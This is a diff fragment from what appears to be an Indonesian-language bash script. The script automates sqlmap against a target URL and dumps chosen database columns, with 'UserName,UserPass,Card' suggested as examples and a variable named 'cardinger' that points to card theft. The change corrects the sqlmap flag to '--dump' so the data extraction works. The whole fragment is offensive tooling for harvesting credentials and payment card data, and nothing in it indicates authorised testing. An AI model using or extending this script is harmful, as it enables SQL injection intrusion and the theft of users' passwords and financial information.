@@ -107,5 +107,5 @@ done
 echo "Contoh: UserName,UserPass,Card (Pisahkan Dengan Koma)"
 read -p "Ketikkan Nama Data Yang Mau Di Ambil: " colums
 
-./sqlmap.py -u $cardinger --random-agent -D $databs -T $tabledd -C $colums --dumps
+./sqlmap.py -u $cardinger --random-agent -D $databs -T $tabledd -C $colums --dump
 echo "SEKIAN SEMOGA SUKSES BOSS!!!"
